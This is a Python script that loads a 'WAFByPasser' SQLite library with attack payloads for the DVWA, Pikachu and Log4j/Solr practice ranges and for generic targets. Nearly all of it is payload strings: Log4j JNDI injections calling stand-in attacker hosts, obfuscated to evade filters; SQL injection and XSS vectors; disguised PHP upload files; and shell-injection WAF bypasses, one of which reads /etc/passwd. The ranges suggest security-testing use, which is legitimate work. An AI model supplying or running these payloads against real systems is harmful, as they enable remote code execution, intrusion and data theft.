"""
Insert comprehensive payloads into WAFByPasser payload library.

Focus areas:
1. Log4j + Solr靶场 — environment confirmation, log triggering, encoding variants
2. DVWA + Pikachu — additional variants for command-injection, file-upload, sql-injection, xss
"""

import sqlite3
import uuid
import sys
from pathlib import Path

DB_PATH = Path(__file__).resolve().parents[1] / "data" / "waf_bypasser.db"

def connect():
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(str(DB_PATH), timeout=10)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA foreign_keys = ON")
    return conn


def insert_payload(conn, name, vulnerability, category, delivery, target, difficulty, content):
    """Insert a single payload, return True if inserted, False if duplicate."""
    # Check for duplicates by name+target
    existing = conn.execute(
        "SELECT id FROM payloads WHERE name = ? AND target = ?",
        (name, target)
    ).fetchone()
    if existing:
        print(f"  [SKIP] Already exists: {name}")
        return False

    conn.execute(
        """
        INSERT INTO payloads (id, name, vulnerability, category, delivery, target, difficulty, content, created_at, archived_from_candidate_id)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, NULL)
        """,
        (str(uuid.uuid4()), name, vulnerability, category, delivery, target, difficulty, content, "靶场已验证"),
    )
    print(f"  [OK] Inserted: {name}")
    return True


# ============================================================================
# Log4j + Solr 靶场 Payloads
# ============================================================================
LOG4J_SOLR_PAYLOADS = [
    # ---- 环境确认 (Environment Confirmation) ----
    # Low — basic DNS/JNDI lookups to confirm Log4j is present
    (
        "Solr · Log4j · Low · JNDI LDAP 基础回连",
        "log4j",
        "环境确认",
        "请求头 / Cookie",
        "Solr",
        "Low",
        "${jndi:ldap://log4j-test.example.com/Evil}",
    ),
    (
        "Solr · Log4j · Low · JNDI DNS 外带确认",
        "log4j",
        "环境确认",
        "请求头 / Cookie",
        "Solr",
        "Low",
        "${jndi:dns://log4j-dns.example.com}",
    ),
    (
        "Solr · Log4j · Low · JNDI RMI 回连测试",
        "log4j",
        "环境确认",
        "请求头 / Cookie",
        "Solr",
        "Low",
        "${jndi:rmi://log4j-rmi.example.com:1099/Evil}",
    ),
    (
        "Solr · Log4j · Low · 环境变量 JAVA_HOME 提取",
        "log4j",
        "环境确认",
        "JSON 请求体",
        "Solr",
        "Low",
        "${env:JAVA_HOME}",
    ),
    (
        "Solr · Log4j · Low · 系统属性 os.name 提取",
        "log4j",
        "环境确认",
        "JSON 请求体",
        "Solr",
        "Low",
        "${sys:os.name}",
    ),

    # ---- 日志触发 (Log Triggering) ----
    # Medium — standard JNDI injection via common header vectors
    (
        "Solr · Log4j · Medium · User-Agent 头注入",
        "log4j",
        "日志触发",
        "请求头 / Cookie",
        "Solr",
        "Medium",
        "User-Agent: ${jndi:ldap://ua-attacker.example.com:1389/Exploit}",
    ),
    (
        "Solr · Log4j · Medium · X-Forwarded-For 头注入",
        "log4j",
        "日志触发",
        "请求头 / Cookie",
        "Solr",
        "Medium",
        "X-Forwarded-For: ${jndi:ldap://xff-attacker.example.com:1389/Exploit}",
    ),
    (
        "Solr · Log4j · Medium · Referer 头注入",
        "log4j",
        "日志触发",
        "请求头 / Cookie",
        "Solr",
        "Medium",
        "Referer: ${jndi:ldap://referer-attacker.example.com:1389/Exploit}",
    ),
    (
        "Solr · Log4j · Medium · Cookie 字段注入",
        "log4j",
        "日志触发",
        "请求头 / Cookie",
        "Solr",
        "Medium",
        "Cookie: session=${jndi:ldap://cookie-attacker.example.com:1389/Exploit}",
    ),
    (
        "Solr · Log4j · Medium · Solr Admin 查询参数注入",
        "log4j",
        "日志触发",
        "URL 查询参数",
        "Solr",
        "Medium",
        "q=${jndi:ldap://solr-q-attacker.example.com:1389/Exploit}",
    ),

    # ---- 编码变体 (Encoding Variants) ----
    # High — bypass techniques for WAF/filter evasion
    (
        "Solr · Log4j · High · Lower 关键字绕过",
        "log4j",
        "编码变体",
        "请求头 / Cookie",
        "Solr",
        "High",
        "${${lower:j}ndi:ldap://lower-bypass.example.com:1389/Exploit}",
    ),
    (
        "Solr · Log4j · High · Upper 关键字绕过",
        "log4j",
        "编码变体",
        "请求头 / Cookie",
        "Solr",
        "High",
        "${${upper:j}ndi:ldap://upper-bypass.example.com:1389/Exploit}",
    ),
    (
        "Solr · Log4j · High · 空字符串拼接绕过",
        "log4j",
        "编码变体",
        "请求头 / Cookie",
        "Solr",
        "High",
        "${${::-j}${::-n}${::-d}${::-i}:ldap://empty-str-bypass.example.com:1389/Exploit}",
    ),
    (
        "Solr · Log4j · High · 嵌套 Lower 混淆绕过",
        "log4j",
        "编码变体",
        "请求头 / Cookie",
        "Solr",
        "High",
        "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://nest-lower.example.com:1389/Exploit}",
    ),
    (
        "Solr · Log4j · High · 日期查找干扰绕过",
        "log4j",
        "编码变体",
        "请求头 / Cookie",
        "Solr",
        "High",
        "${${date:yyyy}${jndi:ldap://date-bypass.example.com:1389/Exploit}}",
    ),
    (
        "Solr · Log4j · High · 多级嵌套混淆",
        "log4j",
        "编码变体",
        "请求头 / Cookie",
        "Solr",
        "High",
        "${${lower:${lower:j}}ndi:${lower:l}dap://multi-nest.example.com:1389/Exploit}",
    ),
    (
        "Solr · Log4j · High · Env+Bypass 组合变量提取",
        "log4j",
        "编码变体",
        "JSON 请求体",
        "Solr",
        "High",
        "${${env:SHELL:-${env:COMSPEC:-/bin/sh}}}",
    ),
    (
        "Solr · Log4j · High · Sys属性 Java版本探测",
        "log4j",
        "编码变体",
        "JSON 请求体",
        "Solr",
        "High",
        "${sys:java.version} — ${sys:java.vendor}",
    ),
]

# ============================================================================
# DVWA 补充 Payloads (other 4 vulnerability types)
# ============================================================================
DVWA_EXTRA_PAYLOADS = [
    # ---- 命令注入补充 ----
    (
        "DVWA · 命令注入 · Low · 管道符回显验证",
        "command-injection",
        "基础命令",
        "表单字段",
        "DVWA",
        "Low",
        "| echo DVWA_CMD_LOW_PIPE_OK",
    ),
    (
        "DVWA · 命令注入 · Low · AND 运算符回显",
        "command-injection",
        "基础命令",
        "表单字段",
        "DVWA",
        "Low",
        "&& echo DVWA_CMD_LOW_AND_OK",
    ),
    (
        "DVWA · 命令注入 · Medium · AND 运算符回显",
        "command-injection",
        "参数拼接",
        "表单字段",
        "DVWA",
        "Medium",
        "&& echo DVWA_CMD_MEDIUM_AND_OK",
    ),
    (
        "DVWA · 命令注入 · High · 反引号回显",
        "command-injection",
        "参数拼接",
        "表单字段",
        "DVWA",
        "High",
        "`echo DVWA_CMD_HIGH_BACKTICK_OK`",
    ),

    # ---- SQL 注入补充 ----
    (
        "DVWA · SQL 注入 · Low · UNION 联合查询",
        "sql-injection",
        "通用语法",
        "URL 查询参数",
        "DVWA",
        "Low",
        "' UNION SELECT 1,2,3,4,5 #",
    ),
    (
        "DVWA · SQL 注入 · Low · 报错注入 ExtractValue",
        "sql-injection",
        "报错分析",
        "URL 查询参数",
        "DVWA",
        "Low",
        "' AND ExtractValue(1, CONCAT(0x7e, database(), 0x7e)) #",
    ),
    (
        "DVWA · SQL 注入 · Low · 时间盲注 Sleep",
        "sql-injection",
        "布尔判定",
        "URL 查询参数",
        "DVWA",
        "Low",
        "' AND SLEEP(5) #",
    ),
    (
        "DVWA · SQL 注入 · Medium · UNION 联合查询",
        "sql-injection",
        "通用语法",
        "URL 查询参数",
        "DVWA",
        "Medium",
        "1 UNION SELECT 1,2,3,4,5 #",
    ),
    (
        "DVWA · SQL 注入 · High · 报错注入 UpdateXML",
        "sql-injection",
        "报错分析",
        "URL 查询参数",
        "DVWA",
        "High",
        "1' AND UpdateXML(1, CONCAT(0x7e, database(), 0x7e), 1) #",
    ),

    # ---- XSS 补充 ----
    (
        "DVWA · XSS · Low · Body 事件弹窗",
        "xss",
        "反射型",
        "表单字段",
        "DVWA",
        "Low",
        "<body onload=alert('DVWA_XSS_LOW_BODY_OK')>",
    ),
    (
        "DVWA · XSS · Low · IFrame 标签弹窗",
        "xss",
        "反射型",
        "表单字段",
        "DVWA",
        "Low",
        "<iframe src=javascript:alert('DVWA_XSS_LOW_IFRAME_OK')>",
    ),
    (
        "DVWA · XSS · Medium · Input 事件弹窗",
        "xss",
        "反射型",
        "表单字段",
        "DVWA",
        "Medium",
        "<input onfocus=alert('DVWA_XSS_MEDIUM_INPUT_OK') autofocus>",
    ),
    (
        "DVWA · XSS · Medium · Details 标签弹窗",
        "xss",
        "反射型",
        "表单字段",
        "DVWA",
        "Medium",
        "<details open ontoggle=alert('DVWA_XSS_MEDIUM_DETAILS_OK')>",
    ),
    (
        "DVWA · XSS · High · Marquee 标签弹窗",
        "xss",
        "反射型",
        "表单字段",
        "DVWA",
        "High",
        "<marquee onstart=alert('DVWA_XSS_HIGH_MARQUEE_OK')>",
    ),

    # ---- 文件上传补充 ----
    (
        "DVWA · 文件上传 · Low · PHP 长标签回显",
        "file-upload",
        "内容校验",
        "multipart/form-data 文件字段",
        "DVWA",
        "Low",
        "filename: dvwa-low-long.php\ncontent: <script language=php> echo 'DVWA_UPLOAD_LOW_LONG_OK'; </script>",
    ),
    (
        "DVWA · 文件上传 · Medium · PNG/PHP 复合文件",
        "file-upload",
        "内容校验",
        "multipart/form-data 文件字段",
        "DVWA",
        "Medium",
        "filename: dvwa-medium.png.php\ncontent-type: image/png\ncontent: \x89PNG\r\n\x1a\n<?php echo 'DVWA_UPLOAD_MEDIUM_PNG_OK'; ?>",
    ),
]

# ============================================================================
# Pikachu 补充 Payloads
# ============================================================================
PIKACHU_EXTRA_PAYLOADS = [
    # ---- 命令注入补充 ----
    (
        "Pikachu · 命令注入 · 基础 · 管道符回显",
        "command-injection",
        "基础命令",
        "表单字段",
        "Pikachu",
        "基础",
        "| echo PIKACHU_CMD_BASIC_PIPE_OK",
    ),
    (
        "Pikachu · 命令注入 · 高级 · 反引号回显",
        "command-injection",
        "参数拼接",
        "表单字段",
        "Pikachu",
        "高级",
        "`echo PIKACHU_CMD_ADV_BACKTICK_OK`",
    ),

    # ---- SQL 注入补充 ----
    (
        "Pikachu · SQL 注入 · 基础 · UNION 联合查询",
        "sql-injection",
        "通用语法",
        "URL 查询参数",
        "Pikachu",
        "基础",
        "' UNION SELECT 1,2,3,4,5 #",
    ),
    (
        "Pikachu · SQL 注入 · 基础 · 报错注入",
        "sql-injection",
        "报错分析",
        "URL 查询参数",
        "Pikachu",
        "基础",
        "' AND ExtractValue(1, CONCAT(0x7e, database(), 0x7e)) #",
    ),
    (
        "Pikachu · SQL 注入 · 高级 · 时间盲注",
        "sql-injection",
        "布尔判定",
        "URL 查询参数",
        "Pikachu",
        "高级",
        "1' AND SLEEP(5) #",
    ),
    (
        "Pikachu · SQL 注入 · 高级 · 宽字节注入 GBK",
        "sql-injection",
        "编码变体",
        "URL 查询参数",
        "Pikachu",
        "高级",
        "1%df' OR '1'='1' #",
    ),

    # ---- XSS 补充 ----
    (
        "Pikachu · XSS · 基础 · IMG 事件弹窗",
        "xss",
        "反射型",
        "表单字段",
        "Pikachu",
        "基础",
        "<img src=x onerror=alert('PIKACHU_XSS_BASIC_IMG_OK')>",
    ),
    (
        "Pikachu · XSS · 基础 · A 标签 JS 伪协议",
        "xss",
        "反射型",
        "表单字段",
        "Pikachu",
        "基础",
        "<a href=javascript:alert('PIKACHU_XSS_BASIC_A_OK')>click</a>",
    ),
    (
        "Pikachu · XSS · 高级 · Input 自动聚焦弹窗",
        "xss",
        "反射型",
        "表单字段",
        "Pikachu",
        "高级",
        "<input onfocus=alert('PIKACHU_XSS_ADV_INPUT_OK') autofocus>",
    ),
    (
        "Pikachu · XSS · 高级 · 编码混淆弹窗",
        "xss",
        "反射型",
        "表单字段",
        "Pikachu",
        "高级",
        "<svg><script>alert&#40'PIKACHU_XSS_ADV_ENC_OK'&#41</script></svg>",
    ),

    # ---- 文件上传补充 ----
    (
        "Pikachu · 文件上传 · 基础 · PHP 短标签回显",
        "file-upload",
        "内容校验",
        "multipart/form-data 文件字段",
        "Pikachu",
        "基础",
        "filename: pikachu-basic-short.php\ncontent: <?='PIKACHU_UPLOAD_BASIC_SHORT_OK'?>",
    ),
    (
        "Pikachu · 文件上传 · 高级 · 双扩展名绕过",
        "file-upload",
        "文件名校验",
        "multipart/form-data 文件字段",
        "Pikachu",
        "高级",
        "filename: pikachu-advanced.php.jpg\ncontent: <?php echo 'PIKACHU_UPLOAD_ADV_DOUBLE_OK'; ?>",
    ),
]

# ============================================================================
# 命令注入 WAF 绕过 Payloads（通用/无特定靶场依赖）
# ============================================================================
CMD_INJECTION_WAF_BYPASS_PAYLOADS = [
    # ---- 基础级：替代分隔符与执行模型 ----
    (
        "命令注入 · 通用 · 反引号命令替换",
        "command-injection",
        "命令替换",
        "表单字段",
        "通用",
        "基础",
        "`echo BACKTICK_CMD_OK`",
    ),
    (
        "命令注入 · 通用 · here-string重定向",
        "command-injection",
        "重定向",
        "表单字段",
        "通用",
        "基础",
        ";cat<<<HERESTR_CMD_OK",
    ),
    (
        "命令注入 · 通用 · 管道链式执行",
        "command-injection",
        "管道链",
        "表单字段",
        "通用",
        "基础",
        "|echo PIPE_CMD_OK",
    ),
    (
        "命令注入 · 通用 · OR逻辑链执行",
        "command-injection",
        "逻辑链",
        "表单字段",
        "通用",
        "基础",
        "||echo ORCHAIN_CMD_OK",
    ),
    (
        "命令注入 · 通用 · AND逻辑链执行",
        "command-injection",
        "逻辑链",
        "表单字段",
        "通用",
        "基础",
        "&&echo ANDCHAIN_CMD_OK",
    ),
    (
        "命令注入 · 通用 · 后台进程执行",
        "command-injection",
        "后台执行",
        "表单字段",
        "通用",
        "基础",
        "&echo BG_CMD_OK",
    ),
    # ---- 中等级：WAF 关键字/空格绕过 ----
    (
        "命令注入 · 通用 · IFS空格绕过",
        "command-injection",
        "IFS绕过",
        "表单字段",
        "通用",
        "中等",
        ";echo${IFS}IFS_CMD_OK",
    ),
    (
        "命令注入 · 通用 · 变量拼接命令名",
        "command-injection",
        "变量间接",
        "表单字段",
        "通用",
        "中等",
        ";a=ec;b=ho;$a$b VARCAT_CMD_OK",
    ),
    (
        "命令注入 · 通用 · 通配符命令路径",
        "command-injection",
        "通配符绕过",
        "表单字段",
        "通用",
        "中等",
        ";$(/bin/e?h? WILD_CMD_OK)",
    ),
    (
        "命令注入 · 通用 · 花括号命令展开",
        "command-injection",
        "花括号展开",
        "表单字段",
        "通用",
        "中等",
        ";{echo,BRACE_CMD_OK,;}",
    ),
    (
        "命令注入 · 通用 · 环境变量默认值执行",
        "command-injection",
        "环境变量",
        "表单字段",
        "通用",
        "中等",
        ";${PATH:+echo} ENV_CMD_OK",
    ),
    (
        "命令注入 · 通用 · subshell括号执行",
        "command-injection",
        "子shell",
        "表单字段",
        "通用",
        "中等",
        ";(echo SUBSH_CMD_OK)",
    ),
    (
        "命令注入 · 通用 · xargs管道执行",
        "command-injection",
        "管道执行",
        "表单字段",
        "通用",
        "中等",
        ";echo XARGS_CMD_OK|xargs echo",
    ),
    (
        "命令注入 · 通用 · 大小写混合命令名",
        "command-injection",
        "大小写绕过",
        "表单字段",
        "通用",
        "中等",
        ";$(tr 'A-Z' 'a-z'<<<'ECHO CASEMIX_CMD_OK'|sh)",
    ),
    # ---- 高级：多层编码/复杂构造 ----
    (
        "命令注入 · 通用 · printf八进制构造命令",
        "command-injection",
        "printf构造",
        "表单字段",
        "通用",
        "高级",
        ";$(printf '\145\143\150\157 PRNTF_CMD_OK')",
    ),
    (
        "命令注入 · 通用 · base64解码执行",
        "command-injection",
        "编码执行",
        "表单字段",
        "通用",
        "高级",
        ";$(echo ZWNobyBCNjRfQ01EX09L|base64 -d)",
    ),
    (
        "命令注入 · 通用 · hex转义命令执行",
        "command-injection",
        "十六进制转义",
        "表单字段",
        "通用",
        "高级",
        ";$'\145\143\150\157' HEX_CMD_OK",
    ),
    (
        "命令注入 · 通用 · 进程替换执行",
        "command-injection",
        "进程替换",
        "表单字段",
        "通用",
        "高级",
        ";cat <(echo PROCSUB_CMD_OK)",
    ),
    (
        "命令注入 · 通用 · eval动态解码执行",
        "command-injection",
        "eval链",
        "表单字段",
        "通用",
        "高级",
        ";eval $(echo ZWNobyBFVkFMX0NNRF9PSw==|base64 -d)",
    ),
    (
        "命令注入 · 通用 · 换行URL编码绕过",
        "command-injection",
        "换行注入",
        "URL查询参数",
        "通用",
        "高级",
        "%0aecho URLNL_CMD_OK",
    ),
    (
        "命令注入 · 通用 · 复合IFS变量绕过",
        "command-injection",
        "IFS绕过",
        "表单字段",
        "通用",
        "高级",
        ";$(a=ec;b=ho;IFS=_;$a$b IFSCOMP_CMD_OK)",
    ),
    (
        "命令注入 · 通用 · printf花括号组合绕过",
        "command-injection",
        "printf构造",
        "表单字段",
        "通用",
        "高级",
        "%0a{printf,'%s',PRNTFBR_CMD_OK}",
    ),
    (
        "命令注入 · 通用 · xxd十六进制解码执行",
        "command-injection",
        "编码执行",
        "表单字段",
        "通用",
        "高级",
        ";$(echo 6563686f205858445f434d445f4f4b|xxd -r -p)",
    ),
    (
        "命令注入 · 通用 · 环境变量PATH遍历命令",
        "command-injection",
        "环境变量",
        "表单字段",
        "通用",
        "高级",
        ";$(PATH=/bin:/usr/bin;which echo) PATHWALK_CMD_OK",
    ),
    (
        "命令注入 · 通用 · IFS制表符空格双绕过",
        "command-injection",
        "IFS绕过",
        "表单字段",
        "通用",
        "高级",
        ";{cat,/etc${IFS}passwd,;,}|head -1",
    ),
]


def main():
    conn = connect()

    # Verify tables exist
    tables = conn.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()
    table_names = [t["name"] for t in tables]
    print(f"Database tables: {table_names}")

    count_before = conn.execute("SELECT COUNT(*) as cnt FROM payloads").fetchone()["cnt"]
    print(f"Payload count before insert: {count_before}\n")

    total_inserted = 0

    # =========================================================================
    # 1. Log4j + Solr 靶场 (18 payloads)
    # =========================================================================
    print("=" * 60)
    print("Inserting Log4j + Solr靶场 payloads...")
    print("=" * 60)
    for name, vuln, cat, delivery, target, diff, content in LOG4J_SOLR_PAYLOADS:
        if insert_payload(conn, name, vuln, cat, delivery, target, diff, content):
            total_inserted += 1

    # =========================================================================
    # 2. DVWA 补充 (15 payloads)
    # =========================================================================
    print("\n" + "=" * 60)
    print("Inserting DVWA extra payloads...")
    print("=" * 60)
    for name, vuln, cat, delivery, target, diff, content in DVWA_EXTRA_PAYLOADS:
        if insert_payload(conn, name, vuln, cat, delivery, target, diff, content):
            total_inserted += 1

    # =========================================================================
    # 3. Pikachu 补充 (12 payloads)
    # =========================================================================
    print("\n" + "=" * 60)
    print("Inserting Pikachu extra payloads...")
    print("=" * 60)
    for name, vuln, cat, delivery, target, diff, content in PIKACHU_EXTRA_PAYLOADS:
        if insert_payload(conn, name, vuln, cat, delivery, target, diff, content):
            total_inserted += 1

    # =========================================================================
    # 4. 命令注入 WAF 绕过 (25 payloads)
    # =========================================================================
    print("\n" + "=" * 60)
    print("Inserting command-injection WAF bypass payloads...")
    print("=" * 60)
    for name, vuln, cat, delivery, target, diff, content in CMD_INJECTION_WAF_BYPASS_PAYLOADS:
        if insert_payload(conn, name, vuln, cat, delivery, target, diff, content):
            total_inserted += 1

    conn.commit()

    count_after = conn.execute("SELECT COUNT(*) as cnt FROM payloads").fetchone()["cnt"]

    # Summary by vulnerability
    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    print(f"Total inserted: {total_inserted}")
    print(f"Payload count before: {count_before}")
    print(f"Payload count after:  {count_after}")
    print()

    stats = conn.execute("""
        SELECT vulnerability, target, COUNT(*) as cnt
        FROM payloads
        GROUP BY vulnerability, target
        ORDER BY vulnerability, target
    """).fetchall()

    for row in stats:
        print(f"  {row['vulnerability']:20s} | {row['target']:10s} | {row['cnt']:3d} payloads")

    conn.close()
    print("\nDone!")


if __name__ == "__main__":
    main()
